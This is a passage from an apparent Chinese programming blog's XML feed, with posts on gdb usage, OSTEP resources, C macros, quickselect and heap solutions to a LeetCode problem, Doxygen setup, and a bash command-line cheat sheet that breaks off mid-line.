id="分割窗口"><a href="#分割窗口" class="headerlink" title="分割窗口"></a>分割窗口</h1><ul><li>layout：用于分割窗口，可以一边查看代码，一边测试：</li><li>layout src：显示源代码窗口</li><li>layout asm：显示反汇编窗口</li><li>layout regs：显示源代码/反汇编和CPU寄存器窗口</li><li>layout split：显示源代码和反汇编窗口</li><li>Ctrl + L：刷新窗口</li></ul><h1 id="带参数调试"><a href="#带参数调试" class="headerlink" title="带参数调试"></a>带参数调试</h1><ul><li><p><code>gdb &lt;prog&gt;</code>之后，进入gdb界面，输入set args 123 abc xxx，则相当于给程序prog传入了三个参数123、abc、xxx</p></li><li><p>gdb –args prog 123 abc xxx，相当于给程序prog传入了三个参数123、abc、xxx</p></li><li><p>在gdb界面下，show args命令可以查看传入的参数</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gdb，调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSTEP导言</title>
    <link href="/p/decf1347/"/>
    <url>/p/decf1347/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/ostep.jpg"></p><p>学 OSTEP 不做实验，就像四大名著不看红楼梦，说明这个人文学造诣和自我修养不足，他理解不了这种内在的阳春白雪的高雅艺术，他只能看到外表的辞藻堆砌，参不透其中深奥的精神内核，他整个人的层次就卡在这里了，只能度过一个相对失败的人生。</p><ul><li><p><a href="https://github.com/remzi-arpacidusseau/ostep-projects">OSTEP Github Project</a></p><ul><li>官方的github链接，包含多个仓库</li></ul></li><li><p><a href="https://pages.cs.wisc.edu/~remzi/OSTEP/">OSTEP课程网站</a>，包含：</p><ul><li>课程schedule</li><li>PDF课本、PPT</li><li>lab</li></ul></li><li><p><a href="https://github.com/remzi-arpacidusseau/ostep-homework/">课后作业Github链接</a></p></li><li><p><a href="https://pages.cs.wisc.edu/~remzi/OSTEP/Homework/homework.html">课后作业的官方网站</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSTEP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，OSTEP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言：预处理与宏定义详解</title>
    <link href="/p/96b16a89/"/>
    <url>/p/96b16a89/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/cpro.png"></p><h1 id="预处理的步骤"><a href="#预处理的步骤" class="headerlink" title="预处理的步骤"></a>预处理的步骤</h1><p>C编译器做<strong>语法解析</strong>之前的<strong>预处理步骤</strong>：</p><ul><li>对define语句进行替换<ul><li><code>\</code>可以把分行的代码连接成一行</li><li>将注释替换为一个空格</li></ul></li></ul><p>宏可被<code>\</code>分割</p><blockquote><p>   #define STR “hello, “  \<br>  “world”</p><p>  #define MAIN       \<br>    int main()         \<br>    {                 \<br>        return 0;     \<br>    }</p></blockquote><p>内核中出现了大量的复杂宏定义，因此深入宏是十分必要的</p><p><a href="https://www.boost.org/doc/libs/1_65_1/libs/preprocessor/doc/index.html">一个神鬼莫测的宏的示例</a></p><h2 id="条件预处理指示"><a href="#条件预处理指示" class="headerlink" title="条件预处理指示"></a>条件预处理指示</h2><p>两个示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> <span class="hljs-meta-string">&lt;token&gt;</span></span><br><span class="hljs-comment">/* code */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-comment">/* code to include if the token is defined */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DLEVEL &gt; 5</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIGNAL  1</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> STACKUSE == 1</span><br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK   200</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK   100</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIGNAL  0</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> STACKUSE == 1</span><br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK   100</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK   50</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DLEVEL == 0</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> DLEVEL == 1</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> DLEVEL &gt; 5</span><br>    display( debugptr );<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK 200</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h1 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h1><h2 id="变量式宏定义（object-like-macro）"><a href="#变量式宏定义（object-like-macro）" class="headerlink" title="变量式宏定义（object-like macro）"></a>变量式宏定义（object-like macro）</h2><p>宏定义名可以像变量一样在代码中使用，形式类似：<br><code>#define STR &quot;hello, world&quot;</code></p><h2 id="函数式宏定义（function-like-macro）"><a href="#函数式宏定义（function-like-macro）" class="headerlink" title="函数式宏定义（function-like macro）"></a>函数式宏定义（function-like macro）</h2><p>宏定义可以像函数调用一样在代码中使用，形式类似：<br><code>#define MAX(a, b) ((a)&gt;(b)?(a):(b))</code></p><p>函数式宏定义的优势（相比较函数）</p><ul><li>省去了分配和释放栈帧、传参、传返回值等一系列工作</li><li>简短并且被频繁调用的函数经常用函数式宏定义来代替实现。例如C标准库的很多函数都提供两种实现，一种是真正的函数实现，一种是宏定义实现</li><li>inline关键字告诉编译器，这个函数的调用要尽可能快，可以当普通的函数调用实现，也可以用<strong>宏展开</strong>的办法实现</li></ul><p>为了检查编译器对宏所做的<strong>替换</strong>操作，可以使用gcc -E命令</p><p>宏定义需要注意的事情：</p><ul><li><strong>宏可以重复定义，但是每次的定义均需相同。</strong> 如果需要重新定义一个宏，和原来的定义不同，可以先用#undef取消原来的定义，再重新定义</li><li>如果MAX被定义为<code>#define MAX(a, b) (a&gt;b?a:b)</code>，那么MAX(i&amp;0x0f, j&amp;0x0f)将会被展开为<code>(i&amp;0x0f&gt;j&amp;0x0f?i&amp;0x0f:j&amp;0x0f)</code>而不是<code>((i&amp;0x0f)&gt;(j&amp;0x0f)?(i&amp;0x0f):(j&amp;0x0f))</code>，由于&gt;结合优先级高于&amp;，因此会出现很难找到的bug</li><li><h2 id="do-while-0"><a href="#do-while-0" class="headerlink" title="do{}while(0)"></a>do{}while(0)</h2>内核中宏定义常常写成：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> device_init_wakeup(dev,val) \</span><br><span class="hljs-meta">do &#123; \</span><br><span class="hljs-meta">device_can_wakeup(dev) = !!(val); \</span><br><span class="hljs-meta">device_set_wakeup_enable(dev,val); \</span><br><span class="hljs-meta">&#125; while(0)</span><br></code></pre></td></tr></table></figure>这里用do { … } while(0)括起来了，如果没有括起来：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> device_init_wakeup(dev,val) \</span><br><span class="hljs-meta">    &#123;device_can_wakeup(dev) = !!(val); \</span><br><span class="hljs-meta">    device_set_wakeup_enable(dev,val);&#125;</span><br><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>)<br>    device_init_wakeup(d, v);<br></code></pre></td></tr></table></figure>当使用以下if else语句时，会因多出一个<code>;</code>报错<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>)<br>    device_init_wakeup(d, v);<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">continue</span>;<br></code></pre></td></tr></table></figure></li></ul><h2 id="、-、可变参数"><a href="#、-、可变参数" class="headerlink" title="#、##、可变参数"></a>#、##、可变参数</h2><ul><li>对于函数式宏，#可以将参数转换为字符串（并非简单的加“”，这里已经过转义）</li><li>##可以用于上面两种宏，可以将前后两个预处理Token连接成一个预处理Token</li><li><code>#define showlist(...) printf(#__VA_ARGS__)</code><ul><li>…表示可变参数，上面宏展开后为<code>printf(&quot;The first, second, and third items.&quot;);</code></li><li>在宏定义中，可变参数的部分用__VA_ARGS__表示</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>C语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大厂算法HOT100题——数组中的第K个最大元素</title>
    <link href="/p/68c3bbb2/"/>
    <url>/p/68c3bbb2/</url>
    
    <content type="html"><![CDATA[<p>由于最近实在是太闲了，所以准备把大厂算法HOT100题刷一遍，持续更新</p><h1 id="数组中的第K个最大元素"><a href="#数组中的第K个最大元素" class="headerlink" title="数组中的第K个最大元素"></a>数组中的第K个最大元素</h1><p><strong>LeetCode原题连接</strong>：<a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/">数组中的第K个最大元素</a></p><hr><h2 id="题意："><a href="#题意：" class="headerlink" title="题意："></a>题意：</h2><p>给定整数数组 nums 和整数 k，请返回数组中第 k 个最大的元素。</p><p>请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。</p><h2 id="思路一：快速排序"><a href="#思路一：快速排序" class="headerlink" title="思路一：快速排序"></a>思路一：快速排序</h2><p>手写快排，返回<code>nums[k-1]</code>即可</p><p><a href="https://blog.csdn.net/weixin_43864567/article/details/113753440">三分钟学会快速排序（图示讲解，附代码，通俗易懂）</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;nums,<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span> ;<br>        <span class="hljs-keyword">int</span> x=nums[(l+r)/<span class="hljs-number">2</span>],i=l<span class="hljs-number">-1</span>,j=r+<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(i&lt;j)<br>        &#123;<br>            <span class="hljs-keyword">do</span> i++; <span class="hljs-keyword">while</span>(nums[i]&gt;x);<br>            <span class="hljs-keyword">do</span> j--; <span class="hljs-keyword">while</span>(nums[j]&lt;x);<br>            <span class="hljs-keyword">if</span>(i&lt;j) swap(nums[i],nums[j]);<br>        &#125;<br>        quick_sort(nums,l,j),quick_sort(nums,j+<span class="hljs-number">1</span>,r);        <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        quick_sort(nums,<span class="hljs-number">0</span>,nums.size()<span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">return</span> nums[k<span class="hljs-number">-1</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="思路二：优化后的快排算法"><a href="#思路二：优化后的快排算法" class="headerlink" title="思路二：优化后的快排算法"></a>思路二：优化后的快排算法</h2><p>该优化基于以下原理：</p><ul><li>假若左边数字的个数大于等于k，那么要找的值必在左边，因此只需对左边进行递归排序</li><li> 假若左边数字的个数小于等于k，那么要找的值必在右边，因此只需对右边进行递归排序</li></ul><p>因此，可以将两次的<code>quick_sort</code>调用优化为一次，从而降低栈内存的使用率</p><p>具体可以参考：</p><p><a href="https://blog.csdn.net/weixin_43864567/article/details/116158100?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164016650816780255279049%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=164016650816780255279049&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-116158100.nonecase&utm_term=%E5%BF%AB%E9%80%9F&spm=1018.2226.3001.4450">对快速排序进行尾递归优化</a><br><img src="https://gls.show/images/uploads/big/7ee8350fd674f632b242f6a49989a727.png" alt="在这里插入图片描述"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums,<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> r,<span class="hljs-keyword">int</span> k)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(l==r) <span class="hljs-keyword">return</span> nums[k];<br>        <span class="hljs-keyword">int</span> x=nums[(l+r)/<span class="hljs-number">2</span>],i=l<span class="hljs-number">-1</span>,j=r+<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(i&lt;j)<br>        &#123;<br>            <span class="hljs-keyword">do</span> i++;<span class="hljs-keyword">while</span>(nums[i]&gt;x);<br>            <span class="hljs-keyword">do</span> j--;<span class="hljs-keyword">while</span>(nums[j]&lt;x);<br>            <span class="hljs-keyword">if</span>(i&lt;j) swap(nums[i],nums[j]);<br>        &#125;<br>        <span class="hljs-comment">//int sum=j-l+1;</span><br>        <span class="hljs-keyword">if</span>(k&lt;=j) quick_sort(nums,l,j,k);<br>        <span class="hljs-keyword">else</span> quick_sort(nums,j+<span class="hljs-number">1</span>,r,k);<br>        <span class="hljs-keyword">return</span> nums[k];<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> quick_sort(nums,<span class="hljs-number">0</span>,nums.size()<span class="hljs-number">-1</span>,k<span class="hljs-number">-1</span>);<br>        <br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="思路三：借助priority-queue"><a href="#思路三：借助priority-queue" class="headerlink" title="思路三：借助priority_queue"></a>思路三：借助<code>priority_queue</code></h2><p>维护一个大小为k的小根堆，遍历数组nums中所有元素之后，<code>q.top()</code>即为所求</p><p>算法复杂度：$O(nlog(k))$</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;,greater&lt;<span class="hljs-keyword">int</span>&gt;&gt; q;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:nums)<br>        &#123;<br>            q.push(x);<br>            <span class="hljs-keyword">if</span>(q.size()&gt;k) q.pop();<br>        &#125;<br>        <span class="hljs-keyword">return</span> q.top();<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>leetcode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>算法</tag>
      
      <tag>刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Doxygen从源码中自动生成文档</title>
    <link href="/p/638b5d0d/"/>
    <url>/p/638b5d0d/</url>
    
    <content type="html"><![CDATA[<h2 id="Doxygen-是个什么牛马-？"><a href="#Doxygen-是个什么牛马-？" class="headerlink" title="Doxygen 是个什么牛马 ？"></a>Doxygen 是个什么牛马 ？</h2><hr><p>Doxygen是一款文档生成工具，它可以从带有注释的代码中提取出关键信息，并一键生成各种文档格式（支持的文档格式有：LaTeX、HTML，PDF，RTF、XML、Docbook、Manpage等）。只要你的代码注释符合标准，那么当你代码敲完的时候，文档已经部署完成了</p><p>Doxygen不仅仅可以作为文档，还可以作为大型项目的分析手段。它可以生成函数调用，从而帮助理解程序的逻辑关系。</p><p><strong>支持的语言：</strong></p><ul><li>C、Objective-C、C#、PHP、Java、Python、IDL（Corba、Microsoft 和 UNO/OpenOffice 风格） )、Fortran、VHDL 以及在某种程度上 D</li></ul><p><strong>支持平台：</strong></p><ul><li>Windows</li><li>Linux</li><li>Mac OS X </li><li>多数Unix发行版本</li></ul><p><strong>效果图：（以HTML文档为例）</strong></p><ul><li>文档<br><img src="https://img-blog.csdnimg.cn/75318f67c68e4cff8f3b7b54e955e657.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></li></ul><ul><li>函数调用关系<ul><li>每个函数都是超链接，可以点进去，跳转到对应的文档页面<br><img src="https://img-blog.csdnimg.cn/4ff267974d3f4d519695858981ced12b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></li></ul></li></ul><ul><li>函数<br><img src="https://img-blog.csdnimg.cn/6a7e12869fb341f0b52d84922e5acf4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></li></ul><p>Doxygen的文档功能十分强大，更多的页面在此不一一列举，读者可以自行探索。</p><h2 id="Doxygen-的安装"><a href="#Doxygen-的安装" class="headerlink" title="Doxygen 的安装"></a>Doxygen 的安装</h2><hr><p>打开<a href="https://www.doxygen.nl/download.html">官网</a>，选择对应的操作系统版本即可</p><p>对于Linux版本，可以直接使用<code>sudo apt install doxygen-gui</code>命令安装</p><p><img src="https://img-blog.csdnimg.cn/1dae7f5600ea44829b895f7bc1de834d.png"></p><h2 id="Doxygen-的使用"><a href="#Doxygen-的使用" class="headerlink" title="Doxygen 的使用"></a>Doxygen 的使用</h2><hr><p>在命令行中输入doxywizard会出现doxygen的gui窗口，当然你可以使用命令行操作</p><blockquote><p>以我所使用的Linux系统的Doxygen为例</p></blockquote><p><strong>打开软件后，配置Doxygen项目：</strong></p><ul><li>指定工作路径</li><li>指定文档名称、版本号、源码路径、文档路径等信息</li><li>如下图所示</li></ul><p><img src="https://img-blog.csdnimg.cn/e1f39c7bfdf0479cb3bdd312688cf928.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p><strong>配置mode：</strong></p><p><img src="https://img-blog.csdnimg.cn/114102737b9a4cf49023d2a27d9ddc45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>配置output：</strong></p><p><img src="https://img-blog.csdnimg.cn/d54958942ee24ba79e20b495dc4e768f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="&lt;img src=&quot;image/image-20220101173547950.png&quot; alt=&quot;image-20220101173547950&quot; style=&quot;zoom: 80%;&quot; /&gt;"></p><p><strong>配置diagram：</strong></p><p>此处需要安装graphviz</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> install doxygen graphviz<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d126fd0c331b45ddb4deb976cb7c0fd6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>在expert选项中，可以配置更多的细节：</strong></p><p><img src="https://img-blog.csdnimg.cn/a5d3c78e83844bbfa4449763c4f21d0c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>最后，点击run即可生成文档</strong></p><p><img src="https://img-blog.csdnimg.cn/09c7cbb8a779452a901cdcbc91263ab6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="更多信息"><a href="#更多信息" class="headerlink" title="更多信息"></a>更多信息</h2><p>可以访问官网查看：<a href="https://www.doxygen.nl/index.html">https://www.doxygen.nl/index.html</a></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令行的艺术</title>
    <link href="/p/6aa1f673/"/>
    <url>/p/6aa1f673/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/1654102693071.png">  </p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><ul><li>学习 Bash 的基础知识<ul><li>阅读<code>man bash</code>或者<code>tldr bash</code></li><li>一些别的shell：zsh、fish</li><li>了解bash内置命令</li></ul></li><li>文本编辑器<ul><li>使用vim、EMACS在终端编辑文本</li></ul></li><li>文档<ul><li>man</li><li>tldr</li><li>apropos</li><li>使用help获取帮助信息</li></ul></li><li>输入输出重定向<ul><li>使用 &gt; 和 &lt; 来重定向输出和输入</li><li>使用 | 来重定向管道</li><li>&gt; 会覆盖了输出文件而 &gt;&gt; 是在文件末添加</li><li>标准输出 stdout </li><li>标准错误 stderr</li></ul></li><li>bash任务管理工具<ul><li>&amp;：将任务放在后台执行</li><li>ctrl+c：终止程序</li><li>ctrl+z：挂起程序（配合fg、bg命令使用）</li><li>ctrl+d：终止输入/退出终端</li><li>ctrl-l：清屏</li><li>jobs</li></ul></li><li>ssh 进行远程命令行登录<ul><li>无密码认证登录<ul><li>eval $(ssh-agent)</li><li>ssh-add ~/.ssh/私钥</li><li>在config文件中可以指定一些选项，比如TCPKeepAlive=yes，ServerAliveInterval=15等</li></ul></li></ul></li><li>文件管理工具<ul><li>ls -l每一列的意义</li><li>查看文件内容   <ul><li>less</li><li>tail</li><li>head</li><li>硬链接与软连接</li><li>chown改变文件的所有者/组、chmod改变权限</li><li><code>du -hs *</code>获取磁盘使用情况概述，s表示single dictionary，h表示human-readable form</li><li>du：disk usage</li><li>df：disk filesystem</li></ul></li></ul></li><li>基本的网络管理工具<ul><li>ip</li><li>ifconfig</li></ul></li><li>版本控制系统<ul><li>git</li></ul></li><li>正则表达式<ul><li>grep</li><li>egrep</li><li>熟悉上面命令的-i，-o，-v，-A，-B 和 -C参数</li></ul></li><li>包管理工具<ul><li>学会使用 apt-get，yum，dnf 或 pacman来查找和安装软件包</li><li>pip 来安装基于 Python 的命令行工具</li></ul></li></ul><h1 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h1><ul><li>Tab 键实现自动补全参数</li><li>ctrl-r 搜索命令行历史记录<ul><li>按下 Enter 键会执行当前匹配的命令</li><li>按下右方向键会将匹配项放入当前行中，不会直接执行，以便做出修改</li></ul></li><li>命令修改<ul><li>ctrl-w 删除你键入的最后一个单词</li><li>ctrl-u 可以删除行内光标所在位置之前的内容</li><li>alt-b 和 alt-f 可以以单词为单位移动光标</li><li>ctrl-a 可以将光标移至行首</li><li>ctrl-e 可以将光标移至行尾</li><li>ctrl-k 可以删除光标至行尾的所有内容</li><li>ctrl-l 可以清屏</li><li>键入 man readline 可以查看 Bash 中的默认快捷键</li></ul></li><li>pstree -p 以一种优雅的方式展示进程树</li><li>回到前一个工作路径：cd -</li><li>Alt . :上一个命令</li><li>使用 pgrep 和 pkill 根据名字查找进程或发送信号</li><li>了解发往进程的信号的种类<ul><li>man 7 signal</li></ul></li><li>disown 可以使一个后台进程持续运行，这样关闭shell的时候进程就不会被终止</li><li>w查看登录用户和已经运行时间</li><li>uptime查看已经运行时间</li><li>使用 alias 来创建常用命令的快捷形式</li><li>diff：逐行比较文件</li><li>man unicode，man utf-8，man latin1，man ascii有助于了解通用的编码信息</li><li>mosh<ul><li> ssh的替代</li><li> 使用 UDP 协议</li></ul></li><li> 将 web 服务器上当前目录下所有的文件（以及子目录）暴露给你所处网络的所有用户，使用：python -m http.server 7777 （使用端口 7777 和 Python 3）</li><li>su username切换为别的用户，su - username会使得切换后的环境与该用户登录后的环境相同</li></ul><h1 id="文件和数据处理"><a href="#文件和数据处理" class="headerlink" title="文件和数据处理"></a>文件和数据处理</h1><ul><li>在当前目录下通过文件名查找一个文件，使用类似于这样的命令：find . -iname ‘<em>something</em>‘</li><li>在所有路径下通过文件名查找文件，使用 locate something （但注意到 updatedb 可能没有对最近新建的文件建立索引，所以你可能无法定位到这些未被索引的文件）</li><li>ag是一个find的替代品</li><li>使用pandoc进行Markdown，HTML，以及所有文档格式之间的转换</li><li>wc可以统计行数、字符数、单词数量、字节数（分别对应：l、m、w、c）</li><li>paste可以将文件的多行合并为一行，并且指定分隔符（delimiter）</li><li>join将两个文件中，指定栏位内容相同的行连接起来</li><li>cut裁减命令或者文件输出，比如<code> who | cut -c 1-10</code>将who的输出的每一行的第一个到第十个字符全部输出，其余忽略</li><li>tee 将标准输入复制到文件甚至标准输出，例如 ls -al | tee 